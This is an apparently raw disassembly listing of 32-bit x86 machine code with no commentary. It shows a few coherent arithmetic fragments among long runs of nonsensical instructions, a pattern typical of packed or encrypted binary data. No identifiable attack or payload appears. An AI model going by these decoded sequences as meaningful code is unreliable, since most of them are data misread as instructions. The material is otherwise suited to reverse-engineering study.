  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shr    DWORD PTR [ebp+0x6a],0x48
  405134:	scas   eax,DWORD PTR es:[edi]
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0x7c70707d
  40513e:	sub    DWORD PTR [ecx+0x28],edi
  405141:	or     al,0x79
  405143:	pushf  
  405144:	inc    edx
  405145:	inc    esp
  405146:	dec    ebp
  405147:	lahf   
  405148:	xchg   edx,eax
  405149:	nop
  40514a:	mov    dl,BYTE PTR [edx]
  40514c:	inc    ebx
  40514d:	and    DWORD PTR [edx+0x64],0x58
  405151:	xlat   BYTE PTR ds:[ebx]
  405152:	push   0x42
  405154:	jnp    0x4050ed
  405156:	test   dl,al
  405158:	adc    eax,0xa3215497
  40515d:	or     eax,0x32b7bae3
  405162:	retf   0x2336
  405165:	inc    di
  405167:	daa    
  405168:	xor    BYTE PTR ds:[esi+ebx*8-0x2651b9dd],ah
  405170:	in     al,0xb4
  405172:	out    dx,eax
  405173:	sub    ah,dl
  405175:	dec    ebp
  405176:	push   esp
  405177:	cs dec ebp
  405179:	xor    al,0x76
  40517b:	jp     0x405159
  40517d:	lea    edx,[edx-0x54f0fb23]
  405183:	inc    eax
  405184:	cmp    eax,0xbc7ef784
  405189:	dec    esp
  40518a:	out    0xcb,eax
  40518c:	dec    ebx
  40518d:	or     DWORD PTR [ebx+ecx*4],eax
  405190:	inc    esp
  405191:	inc    esp
  405192:	or     DWORD PTR [ecx-0x7926bd45],esi
  405198:	int    0x92
  40519a:	imul   edi,DWORD PTR [edx+0x3eeee0da],0x977ce6d7
  4051a4:	cmp    BYTE PTR [ecx-0x531639b4],0x4a
  4051ab:	mov    ah,0x63
  4051ad:	inc    ebx
  4051ae:	push   eax
  4051af:	push   cs
  4051b0:	adc    BYTE PTR [ebp-0x364e062c],0xc1
  4051b7:	sub    cl,cl
  4051b9:	icebp  
  4051ba:	inc    ecx
  4051bb:	in     eax,0x84
  4051bd:	add    BYTE PTR [ebp-0x74],ch
  4051c0:	cld    
  4051c1:	retf   
  4051c2:	add    al,0x1
  4051c4:	fsubr  QWORD PTR [esi+0x53]
  4051c7:	int3   
  4051c8:	sbb    DWORD PTR [edi+eax*8+0x2e],0xffffffc4
  4051cd:	push   esp
  4051ce:	adc    DWORD PTR [ebp+0x10d7879d],0x37f07a13
  4051d8:	mov    ds,WORD PTR [eax-0x15ef94df]
  4051de:	or     BYTE PTR [esi+edi*8-0x15],bh
  4051e2:	rcl    BYTE PTR [esi-0x48f99f96],1
  4051e8:	cmp    edi,DWORD PTR [eax-0x7458aeaa]
  4051ee:	and    eax,0xbb51c43a
  4051f3:	or     BYTE PTR [ecx],bh
  4051f5:	push   0x7002c4db
  4051fa:	repz aaa 
  4051fc:	into   
  4051fd:	sbb    eax,0x74a314b4
  405202:	cld    
  405203:	push   eax
  405204:	dec    eax
  405205:	fistp  WORD PTR [esi+0x2a2a4b5e]
  40520b:	jo     0x405222
  40520d:	out    dx,eax
  40520e:	punpckhdq mm1,mm1
  405211:	test   DWORD PTR [eax+0x642bf960],edx
  405217:	adc    DWORD PTR [eax-0x40],ebx
  40521a:	popf   
  40521b:	push   0x53
  40521d:	cmp    ch,dl
  40521f:	xchg   ebx,eax
  405220:	pop    esi
  405221:	xor    edi,esp
  405223:	and    al,0xc
  405225:	dec    ecx
  405226:	pusha  
  405227:	and    BYTE PTR [edi-0x43],dh
  40522a:	aam    0xdd
  40522c:	mov    ch,0x57
  40522e:	out    dx,al
  40522f:	push   cs
  405230:	cmp    eax,0x96b15c4d
  405235:	adc    eax,DWORD PTR [eax+0x5b]
  405238:	inc    ebp
  405239:	ins    BYTE PTR es:[edi],dx
  40523a:	cldemote BYTE PTR [edx]
  40523d:	popf   
  40523e:	pop    es
  40523f:	fisttp QWORD PTR [eax-0x3cf1a8bb]
  405245:	inc    DWORD PTR [ebp-0x69]
  405248:	pusha  
  405249:	sbb    al,0xca
  40524b:	add    ch,bh
  40524d:	jmp    0x4052cb
  40524f:	ret    
  405250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405251:	sub    DWORD PTR [ecx],0xef246be4
  405257:	mov    bh,0x93
  405259:	mov    ds:0x94019b16,al
  40525e:	or     al,0x47
  405260:	(bad)  
  405262:	pop    ss
  405263:	inc    esi
  405264:	call   DWORD PTR [edx]
  405266:	out    0x89,al
  405268:	rcr    ebp,1
  40526a:	call   0x3e16:0xa345ddb2
  405271:	aas    
  405272:	dec    esi
  405273:	xchg   ebp,eax
  405274:	jno    0x40523a
  405276:	jns    0x405238
  405278:	imul   eax,DWORD PTR [edi+0x79],0x2e978df8
  40527f:	jo     0x4052c4
  405281:	and    ebx,eax
  405283:	ficomp DWORD PTR [ebx+0x5a117ec4]
  405289:	mov    ebp,0xd16c8a97
  40528e:	push   edi
  40528f:	and    BYTE PTR [ecx+0x69],cl
  405292:	popa   
  405293:	jbe    0x40525b
  405295:	cs retf 0xf782
  405299:	mov    al,ds:0x17bba4a9
  40529e:	mov    BYTE PTR [edx],dl
  4052a0:	lea    edx,[esi+0x2851ade0]
  4052a6:	pop    esi
  4052a7:	mov    cl,0xcc
  4052a9:	xor    BYTE PTR [ebp+0x6f3445dd],ch
  4052af:	or     eax,0xdadbc2ed
  4052b4:	cmp    dl,BYTE PTR [esi-0x57]
  4052b7:	jmp    0xb006:0x96fda264
  4052be:	mov    dl,0x2c
  4052c0:	imul   esi,ebx,0x51
  4052c3:	sub    ch,al
  4052c5:	(bad)  
  4052c6:	mov    ah,BYTE PTR [ebx-0x7e]
  4052c9:	pop    es
  4052ca:	jns    0x405293
  4052cc:	mov    ecx,0x8d006e3f
  4052d1:	jmp    0xe9b9:0x186d2be7
  4052d8:	pusha  
  4052d9:	add    al,0xd2
  4052db:	mov    ah,0x68
  4052dd:	mov    esp,0x8e47ccf0
  4052e2:	(bad)  
  4052e4:	ret    0x61ef
  4052e7:	(bad)  
  4052e8:	cs mov cl,0x93
  4052eb:	ret    
  4052ec:	clc    
  4052ed:	pop    edx
  4052ee:	test   BYTE PTR [ebp-0x27],dh
  4052f1:	mov    esp,0x1d11d257
  4052f6:	fdivr  QWORD PTR [eax+ebp*8+0x70]
  4052fa:	mov    al,ds:0x3ba8e80f
  4052ff:	inc    edi
  405300:	popa   
  405301:	lods   eax,DWORD PTR ds:[esi]
  405302:	jnp    0x405371
  405304:	addr16 ret 0x276f
  405308:	sti    
  405309:	rol    BYTE PTR [eax*4+0x620e69ec],1
  405310:	ins    BYTE PTR es:[edi],dx
  405311:	sbb    bl,BYTE PTR [edi+0x11]
  405314:	into   
  405315:	js     0x4052f2
  405317:	xlat   BYTE PTR ds:[ebx]
  405318:	nop
  405319:	push   edi
  40531a:	dec    eax
  40531b:	cmp    DWORD PTR [ebp+eiz*2+0x37e0c787],esi
  405322:	pop    edi
  405323:	add    BYTE PTR [edx],ah
  405325:	call   0xf89b:0xa3b9ce54
  40532c:	sub    esi,edx
  40532e:	mov    ds:0xfbe7eda6,eax
  405333:	jae    0x405304
  405335:	stos   DWORD PTR es:[edi],eax
  405336:	jmp    0x39f27cb6
  40533b:	popf   
  40533c:	jge    0x4053bc
  40533e:	or     dl,BYTE PTR [ebx+0x30]
  405341:	dec    ecx
  405342:	repz push ss
  405344:	(bad)  
  405345:	mov    ebp,0x703b02c8
  40534a:	jmp    0x405377
  40534c:	inc    eax
  40534d:	ins    DWORD PTR es:[edi],dx
  40534e:	(bad)  
  40534f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405350:	out    0x83,al
  405352:	inc    eax
  405353:	sti    
  405354:	mov    eax,0x8b91e211
  405359:	mov    dl,0xcd
  40535b:	cmp    eax,0xd7384d9d
  405360:	outs   dx,DWORD PTR ds:[esi]
  405361:	inc    edi
  405362:	cdq    
  405363:	sbb    eax,0x7a44feae
  405368:	test   al,0xd
  40536a:	add    DWORD PTR [eax+0x29d10059],esp
  405370:	mov    ebx,0x61cf12fc
  405375:	in     al,dx
  405376:	dec    esp
  405377:	or     dh,BYTE PTR [ecx-0x49d5f8cc]
  40537d:	out    dx,al
  40537e:	test   BYTE PTR [ebp*2+0x28e9c4c],ah
  405385:	jae    0x40534c
  405387:	mov    DWORD PTR [edi],edi
  405389:	push   ebp
  40538a:	cmp    eax,0x616ba3c7
  40538f:	push   ss
  405390:	imul   ebx,DWORD PTR [ebx-0x21],0xb9fff349
  405397:	mov    eax,ds:0xd8325c13
  40539c:	mov    bh,0xb9
  40539e:	outs   dx,BYTE PTR ds:[esi]
  40539f:	mov    bh,0x4
  4053a1:	stos   BYTE PTR es:[edi],al
  4053a2:	ret    
  4053a3:	lds    eax,FWORD PTR [edi]
  4053a5:	pushf  
  4053a6:	mov    eax,0x16283e02
  4053ab:	shr    DWORD PTR [edx-0xdee575c],cl
  4053b1:	imul   ebp,ecx,0xffffffaf
  4053b4:	dec    eax
  4053b5:	call   0x77b217ae
  4053ba:	jnp    0x4053ec
  4053bc:	or     DWORD PTR [ebx+0x2b],0x3
  4053c0:	in     al,dx
  4053c1:	imul   eax,ecx,0xffffffa8
  4053c4:	pop    ebx
  4053c5:	sahf   
  4053c6:	outs   dx,DWORD PTR ds:[esi]
  4053c7:	aam    0x1c
  4053c9:	test   DWORD PTR [edi-0x5b],eax
  4053cc:	and    ebp,esp
  4053ce:	out    dx,al
  4053cf:	cmp    eax,0x37cbe2d2
  4053d4:	mov    ds:0x64908114,eax
  4053d9:	retf   
  4053da:	rcr    DWORD PTR [edx-0x39],1
  4053dd:	scas   al,BYTE PTR es:[edi]
  4053de:	ds push ebp
  4053e0:	retf   0xea90
  4053e3:	push   eax
  4053e4:	fstp   QWORD PTR [esi]
  4053e6:	or     ch,cl
  4053e8:	int    0xb0
  4053ea:	retf   0x397
  4053ed:	popa   
  4053ee:	dec    esp
  4053ef:	arpl   WORD PTR [esi-0x523a790e],dx
  4053f5:	pop    ebx
  4053f6:	aaa    
  4053f7:	inc    ebp
  4053f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053f9:	mov    cl,0x43
  4053fb:	(bad)  
  4053fc:	jl     0x405391
  4053fe:	dec    esi
  4053ff:	jg     0x405451
  405401:	xor    BYTE PTR [ecx+edx*4],bh
  405404:	retf   
  405405:	mov    BYTE PTR [ebx*1-0x1f4b5d54],bh
  40540c:	mov    al,ds:0x709c079b
  405411:	enter  0x2a44,0x58
  405415:	xchg   ecx,eax
  405416:	push   DWORD PTR [esi-0x64]
  405419:	adc    edi,edx
  40541b:	aaa    
  40541c:	fld    DWORD PTR [ecx*2-0x36890c5]
  405423:	call   0xfbbf163c
  405428:	cli    
  405429:	inc    esi
  40542a:	inc    edx
  40542b:	retf   0xafc
  40542e:	mov    edi,0x612acbdd
  405433:	ins    DWORD PTR es:[edi],dx
  405434:	inc    ecx
  405435:	jmp    0x65b3:0xcd68c72f
  40543c:	jmp    0x4195:0x55355589
  405443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405444:	int    0xa
  405446:	mov    DWORD PTR [ebx+0x26f08b29],0xc07aeb8d
  405450:	fyl2x  
  405452:	mov    dh,0xdb
  405454:	sbb    eax,0x61d4e10a
  405459:	xchg   esi,eax
  40545a:	xor    al,0xb5
  40545c:	adc    dl,ch
  40545e:	jle    0x405487
  405460:	test   al,0x5a
  405462:	outs   dx,DWORD PTR ds:[esi]
  405463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405464:	js     0x40543b
  405466:	loopne 0x405480
  405468:	pop    eax
  405469:	sbb    eax,0x35ec6a1c
  40546e:	je     0x4054ae
  405470:	imul   esp,DWORD PTR [ebx-0x16],0xed9be087
  405477:	xchg   ebx,eax
  405478:	pop    edi
  405479:	inc    edi
  40547a:	push   0x1a7a5275
  40547f:	popa   
  405480:	pop    esi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e704
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e66b,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	int3   
  4054a9:	sbb    dh,al
  4054ab:	popa   
  4054ac:	adc    BYTE PTR [edi],dh
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x40549f
  4054b5:	into   
  4054b6:	out    dx,al
  4054b7:	mov    DWORD PTR [ebx+0xa],esp
  4054ba:	mov    ch,0xe9
  4054bc:	cmp    ebp,DWORD PTR [eax]
  4054be:	inc    edx
  4054bf:	cmp    al,0x63
  4054c1:	pop    ebp
  4054c2:	stos   BYTE PTR es:[edi],al
  4054c3:	sahf   
  4054c4:	push   0xbced3121
  4054c9:	dec    esi
  4054ca:	hlt    
  4054cb:	xchg   BYTE PTR [ebp-0x57c2d840],ch
  4054d1:	dec    ecx
  4054d2:	sbb    bh,BYTE PTR [edx+0x6d]
  4054d5:	mov    edi,0xae2f2e63
  4054da:	gs jns 0x405492
  4054dd:	pop    ebx
  4054de:	or     BYTE PTR [ecx+esi*2],al
  4054e1:	das    
  4054e2:	cmp    al,0xfc
  4054e4:	(bad)
  4054e7:	add    edx,DWORD PTR [esi+0x60]
  4054ea:	mov    dl,0xe9
  4054ec:	mov    DWORD PTR [edx+esi*1],edi
  4054ef:	(bad)
  4054f2:	mov    esp,0x833f59b2
  4054f7:	pushw  0x3c
  4054fa:	sbb    eax,0x215fa0b5
  4054ff:	jmp    0x286016ff
  405504:	aad    0x65
  405506:	bound  eax,QWORD PTR [esi+0x33]
  405509:	mov    al,0xfb
  40550b:	popf   
  40550c:	addr16 or eax,0x16ad9d8e
  405512:	jecxz  0x40552a
  405514:	int    0xbe
  405516:	js     0x405518
  405518:	(bad)  
  405519:	loopne 0x405533
  40551b:	stc    
  40551c:	add    bh,BYTE PTR [ebx-0x73]
  40551f:	iret   
  405520:	cmp    esp,0xffffffcb
  405523:	loop   0x4054f5
  405525:	(bad)  [ebx-0x68]
  405528:	icebp  
  405529:	test   edx,esp
  40552b:	push   0xf37a4de4
  405530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405531:	pcmpeqb mm3,QWORD PTR [ebx+0x68]
  405535:	(bad)  
  405536:	jmp    0x3d6b0fc4
  40553b:	icebp  
  40553c:	mov    ds:0xc95200d0,al
  405541:	sbb    DWORD PTR [ecx+0x47bb4f38],0x942466fc
  40554b:	adc    esp,DWORD PTR [ebp+0x60b35b0]
  405551:	popa   
  405552:	shr    DWORD PTR [eax],0xc9
  405555:	jns    0x405591
  405557:	sub    dh,BYTE PTR [edi+0x2f41dee2]
  40555d:	cmp    edx,eax
  40555f:	add    ebx,DWORD PTR [edi+0x2600ee7a]
  405565:	mov    ch,0x2e
  405567:	xor    eax,0x537356ec
  40556c:	aad    0x3c
  40556e:	jns    0x40557c
  405570:	outs   dx,DWORD PTR ds:[esi]
  405571:	jmp    0xe610afe
  405576:	fwait
  405577:	call   0x772:0x59a34deb
  40557e:	mov    gs,WORD PTR [edx]
  405580:	cdq    
  405581:	jge    0x405557
  405583:	sbb    al,0xcf
  405585:	and    edx,ebp
  405587:	push   esp
  405588:	aam    0xe4
  40558a:	lods   eax,DWORD PTR ds:[esi]
  40558b:	mov    cl,0xd0
  40558d:	imul   edx,DWORD PTR [ecx-0x4753cf10],0xb6a2e952
  405597:	daa    
  405598:	shl    BYTE PTR [esi+0x50eeda77],cl
  40559e:	cdq    
  40559f:	or     dh,ch
  4055a1:	stos   BYTE PTR es:[edi],al
  4055a2:	mov    cl,0xce
  4055a4:	(bad)  
  4055a5:	cmp    eax,DWORD PTR [eax-0x5b9af5da]
  4055ab:	mov    ebx,0xb7ae9a62
  4055b0:	sti    
  4055b1:	add    ebx,DWORD PTR [ebx-0x33]
  4055b4:	stc    
  4055b5:	in     al,dx
  4055b6:	lock mul BYTE PTR [bx+di]
  4055ba:	sub    esi,ebx
  4055bc:	sbb    DWORD PTR [ecx+esi*1-0x7a439a0f],esp
  4055c3:	stos   BYTE PTR es:[edi],al
  4055c4:	xchg   esp,eax
  4055c5:	daa    
  4055c6:	fisttp DWORD PTR ds:0x356fec2a
  4055cc:	xchg   BYTE PTR [esi],cl
  4055ce:	pushf  
  4055cf:	call   0xb0102408
  4055d4:	cmp    al,dl
  4055d6:	add    ecx,DWORD PTR [edi+0x74]
  4055d9:	ror    DWORD PTR [ebx],0xe5
  4055dc:	xor    edx,ebx
  4055de:	call   0x87aa:0x9cb2a05e
  4055e5:	add    DWORD PTR [ebp-0x66],esi
  4055e8:	imul   esp,DWORD PTR [ebx+0x51],0x2f
  4055ec:	mov    ds:0x19c20b8b,al
  4055f1:	not    ch
  4055f3:	hlt    
  4055f4:	mov    bh,0xb
  4055f6:	dec    esp
  4055f7:	fbstp  TBYTE PTR [ebx-0x3463f800]
  4055fd:	push   esp
  4055fe:	in     eax,0xf1
  405600:	inc    esi
  405601:	add    BYTE PTR [ecx],ch
  405603:	dec    ecx
  405604:	es or  eax,0x7ee3be41
  40560a:	repz mov al,0xef
  40560d:	xchg   ecx,eax
  40560e:	out    0xb1,eax
  405610:	mov    eax,?
  405612:	ins    DWORD PTR es:[edi],dx
  405613:	sub    eax,0x7a8cc2a5
  405618:	call   0x25f2:0x2090b34f
  40561f:	push   esp
  405620:	mov    eax,DWORD PTR [ecx-0x48f343c]
  405626:	fldcw  WORD PTR [edi+0x75]
  405629:	cld    
  40562a:	xchg   ecx,eax
  40562b:	into   
  40562c:	add    BYTE PTR [ebx],0x4e
  40562f:	adc    ecx,DWORD PTR [esi+0x1ad8fa1e]
  405635:	xchg   ebp,eax
  405636:	cdq    
  405637:	pop    ss
  405638:	std    
  405639:	inc    ecx
  40563a:	xchg   edi,eax
  40563b:	(bad)  
  40563d:	aad    0x49
  40563f:	xor    bh,BYTE PTR [edx+0x188fe83e]
  405645:	fnsave [edi]
  405647:	in     al,dx
  405648:	add    DWORD PTR [ebx-0x67],eax
  40564b:	ins    DWORD PTR es:[edi],dx
  40564c:	popa   
  40564d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40564e:	push   ds
  40564f:	iret   
  405650:	adc    edi,DWORD PTR [ebp-0x3076cd5e]
  405656:	pusha  
  405657:	jle    0x405655
  405659:	pop    ebp
  40565a:	cld    
  40565b:	pop    es
  40565c:	push   ds
  40565d:	lods   al,BYTE PTR ds:[esi]
  40565e:	rcr    DWORD PTR [ebp-0x3eb79195],1
  405664:	fiadd  DWORD PTR [edi+0x61]
  405667:	outs   dx,DWORD PTR ds:[esi]
  405668:	test   al,0x70
  40566a:	jp     0x4056dd
  40566c:	xchg   BYTE PTR [ecx],ch
  40566e:	imul   ecx,DWORD PTR cs:[ebx-0x426b770c],0x505e58ad
  405679:	jg     0x4056ae
  40567b:	data16 cmp bl,0xc2
  40567f:	into   
  405680:	inc    edx
  405681:	pop    eax
  405682:	add    bl,bh
  405684:	pop    ss
  405685:	idiv   edx
  405687:	or     al,0xa5
  405689:	dec    ebx
  40568a:	inc    ecx
  40568b:	push   cs
  40568c:	stos   DWORD PTR es:[edi],eax
  40568d:	loopne 0x405682
  40568f:	not    BYTE PTR [ecx+0x66]
  405692:	imul   DWORD PTR [ecx]
  405694:	ja     0x405642
  405696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405697:	into   
  405698:	test   al,0x76
  40569a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40569b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40569c:	mov    esp,ecx
  40569e:	jl     0x40567b
  4056a0:	nop
  4056a1:	cmp    esi,edx
  4056a3:	test   BYTE PTR [eax+0x64],ch
  4056a6:	les    esi,FWORD PTR [esp+edi*4-0x31]
  4056aa:	push   0x58
  4056ac:	lods   eax,DWORD PTR ds:[esi]
  4056ad:	inc    esi
  4056ae:	mov    ebx,0x98523ec4
  4056b3:	ret    
  4056b4:	jge    0x405709
  4056b6:	lea    edi,[ecx+0x5f]
  4056b9:	in     eax,dx
  4056ba:	test   DWORD PTR [eax+eax*2],0x97eaea22
  4056c1:	jle    0x4056e1
  4056c3:	adc    al,ch
  4056c5:	push   0x3c0d90b2
  4056ca:	pushf  
  4056cb:	and    DWORD PTR [edx-0xf0cf672],edx
  4056d1:	mov    DWORD PTR [edx-0x2b],esp
  4056d4:	push   ebp
  4056d5:	sub    DWORD PTR [ecx],edi
  4056d7:	bound  esp,QWORD PTR ss:[esi]
  4056da:	pop    ecx
  4056db:	inc    esp
  4056dc:	(bad)  [edi+0xc07e28]
  4056e2:	cwde   
  4056e3:	inc    DWORD PTR [ecx-0x4f76235b]
  4056e9:	dec    esp
  4056ea:	stos   DWORD PTR es:[edi],eax
  4056eb:	fld    QWORD PTR [ebx-0x2bf2807]
  4056f1:	xor    eax,0x4625b362
  4056f6:	mov    ebx,0xa70e747a
  4056fb:	adc    BYTE PTR [edx],ch
  4056fd:	idiv   BYTE PTR [edx+0x7d]
  405700:	outs   dx,BYTE PTR ds:[esi]
  405701:	inc    ebx
  405702:	inc    ebx
  405703:	es dec esi
  405705:	sbb    eax,0xa76e0607
  40570a:	(bad)  
  40570b:	test   al,0xfb
  40570d:	or     ax,0x592c
  405711:	in     eax,dx
  405712:	sbb    al,0xd5
  405714:	sbb    DWORD PTR [ebx-0x1b],esp
  405717:	sbb    ch,BYTE PTR [edi+0x33]
  40571a:	cdq    
  40571b:	mov    eax,0xe3c9bcc2
  405720:	jmp    0xab0d:0xd2cc1889
  405727:	push   edx
  405728:	in     al,dx
  405729:	cmp    al,0x78
  40572b:	fisub  WORD PTR [ebp+0x701636ee]
  405731:	inc    ebp
  405732:	rol    BYTE PTR [eax+0x18],1
  405735:	inc    ebx
  405736:	xchg   esp,eax
  405737:	mov    edi,0xbde39a15
  40573c:	cmp    ch,al
  40573e:	inc    ecx
  40573f:	shr    eax,cl
  405741:	gs xchg esp,eax
  405743:	adc    dl,BYTE PTR [eax+0x4d]
  405746:	fmul   st(6),st
  405748:	fild   WORD PTR cs:[esi+0x65]
  40574c:	(bad)  
  40574d:	push   cs
  40574e:	sub    cl,BYTE PTR [esi-0x62c43518]
  405754:	mov    cl,0x33
  405756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405757:	ror    BYTE PTR [edx],0x7
  40575a:	mov    eax,0x937ee463
  40575f:	mov    bl,0xe2
  405761:	ja     0x4056e8
  405763:	fwait
  405764:	retf   0x27a5
  405767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405768:	sub    dl,BYTE PTR ds:[ecx+0xf]
  40576c:	mov    bh,0x5
  40576e:	push   es
  40576f:	std    
  405770:	inc    edx
  405771:	add    BYTE PTR [ebx],ah
  405773:	add    eax,0x42fcfa
  405778:	mov    ds:0x42fd06,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x24a06e42],eax
  405790:	je     0x405778
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	sti    
  40579b:	in     eax,dx
  40579c:	aad    0xb8
  40579e:	jg     0x40575d
  4057a0:	fucomp st(4)
  4057a2:	ins    DWORD PTR es:[edi],dx
  4057a3:	adc    eax,0x4af49e91
  4057a8:	xchg   edx,eax
  4057a9:	(bad)  
  4057ab:	adc    dl,0xc1
  4057ae:	test   DWORD PTR ds:0x48597223,0x9d5e52f1
  4057b8:	repnz pop eax
  4057ba:	jle    0x4057ce
  4057bc:	xchg   bl,ch
  4057be:	stos   DWORD PTR es:[edi],eax
  4057bf:	scas   eax,DWORD PTR es:[edi]
  4057c0:	fs sub ax,0x6bb2
  4057c5:	mov    ah,BYTE PTR [esi]
  4057c7:	(bad)  
  4057c8:	sbb    al,0x72
  4057ca:	xor    BYTE PTR ds:0x2f17111f,ah
  4057d0:	xchg   DWORD PTR [ebx],edx
  4057d2:	push   ebp
  4057d3:	push   es
  4057d4:	stc    
  4057d5:	mul    DWORD PTR [esi]
  4057d7:	lods   al,BYTE PTR ds:[esi]
  4057d8:	(bad)  
  4057d9:	or     al,0x85
  4057db:	adc    bl,BYTE PTR [ebx-0x19f1060c]
  4057e1:	ins    DWORD PTR es:[edi],dx
  4057e2:	pop    eax
  4057e3:	push   edi
  4057e4:	jno    0x4057bf
  4057e6:	or     DWORD PTR [edx],esp
  4057e8:	or     BYTE PTR es:[ecx],0x7b
  4057ec:	cmp    BYTE PTR [ebx+eax*2],bh
  4057ef:	sub    ah,BYTE PTR [esi]
  4057f1:	lods   al,BYTE PTR ds:[esi]
  4057f2:	test   eax,0xce09a786
  4057f7:	and    edi,DWORD PTR [eax-0x6accf950]
  4057fd:	mov    edi,edi
  4057ff:	push   edi
  405800:	std    
  405801:	(bad)  
  405802:	dec    ebp
  405803:	add    ecx,DWORD PTR [ebx-0x13]
  405806:	mov    edi,0x8801f256
  40580b:	scas   al,BYTE PTR es:[edi]
  40580c:	push   ds
  40580d:	adc    bl,BYTE PTR [esi-0x53a2f8b2]
  405813:	mov    ss,WORD PTR [esi]
  405815:	pushf  
  405816:	stos   DWORD PTR es:[edi],eax
  405817:	outs   dx,BYTE PTR ds:[esi]
  405818:	add    eax,ebx
  40581a:	mov    edx,0x2997f7c5
  40581f:	cmp    eax,0x48751931
  405824:	and    DWORD PTR [esi-0x6b19c22f],ebx
  40582a:	sbb    esp,0x4b
  40582d:	cmp    eax,0x2cccd2b2
  405832:	push   0xfffffffd
  405834:	lea    edi,[edx-0x5]
  405837:	fsub   QWORD PTR [ebp-0x26]
  40583a:	jns    0x4057e7
  40583c:	mov    eax,ds:0x366cb18f
  405841:	adc    esi,esi
  405843:	dec    esi
  405844:	test   DWORD PTR [esi+0x24ab8db4],edi
  40584a:	sub    edi,ebp
  40584c:	pop    esi
  40584d:	cmp    edx,esp
  40584f:	shl    esi,cl
  405851:	test   al,0xe
  405853:	xor    al,0x4
  405855:	lods   eax,DWORD PTR ds:[esi]
  405856:	or     DWORD PTR [esi+ebx*2+0x35ee681d],ecx
  40585d:	push   ebp
  40585e:	adc    BYTE PTR [esp+ebx*1+0x1072d189],bl
  405865:	sbb    BYTE PTR [edi+eiz*4-0x7a],dh
  405869:	pop    esp
  40586a:	test   BYTE PTR [ebx],dh
  40586c:	xor    BYTE PTR [ebx],dl
  40586e:	(bad)  
  40586f:	xlat   BYTE PTR ds:[ebx]
  405870:	test   al,0xfc
  405872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405873:	mov    WORD PTR [ecx-0x1],fs
  405876:	jecxz  0x4057f8
  405878:	(bad)  
  40587a:	fdiv   DWORD PTR [ecx]
  40587c:	push   edi
  40587d:	and    eax,DWORD PTR [ebx-0x64]
  405880:	cdq    
  405881:	inc    edi
  405882:	fbstp  TBYTE PTR [esi+0xb447df2]
  405888:	jb     0x4058ee
  40588a:	jne    0x40580e
  40588c:	loope  0x4058ed
  40588e:	push   ds
  40588f:	or     esi,esp
  405891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405892:	pop    esi
  405893:	xchg   edx,eax
  405894:	loope  0x405872
  405896:	adc    DWORD PTR [eax+0x7580cc5],ecx
  40589c:	pop    edi
  40589d:	shr    DWORD PTR [edx],0x84
  4058a0:	cs aaa 
  4058a2:	and    BYTE PTR [ebp+0x63],0xba
  4058a6:	sub    BYTE PTR [esi-0x41f5a199],dl
  4058ac:	cwde   
  4058ad:	stc    
  4058ae:	shr    BYTE PTR [edx-0x1cec8689],cl
  4058b4:	inc    ebx
  4058b5:	aad    0xa1
  4058b7:	sbb    BYTE PTR [esi+edi*2],cl
  4058ba:	jecxz  0x40584c
  4058bc:	add    ch,BYTE PTR [ebp-0x30ce4915]
  4058c2:	mov    ds:0xe643589d,eax
  4058c7:	cli    
  4058c8:	pop    esp
  4058c9:	push   ds
  4058ca:	in     eax,0x1d
  4058cc:	test   DWORD PTR [edi-0x6fbcf75e],0xd1c85659
  4058d6:	es pusha 
  4058d8:	and    eax,0x3b9bf67c
  4058dd:	sbb    ebx,DWORD PTR [edi]
  4058df:	sar    BYTE PTR [ebx],1
  4058e1:	sbb    eax,0x93f9b793
  4058e6:	mov    bl,0xbc
  4058e8:	xor    edx,DWORD PTR [ebx+ebp*2]
  4058eb:	je     0x4058eb
  4058ed:	add    al,cl
  4058ef:	in     eax,0x83
  4058f1:	jbe    0x4058e2
  4058f3:	inc    ecx
  4058f4:	xchg   edi,eax
  4058f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
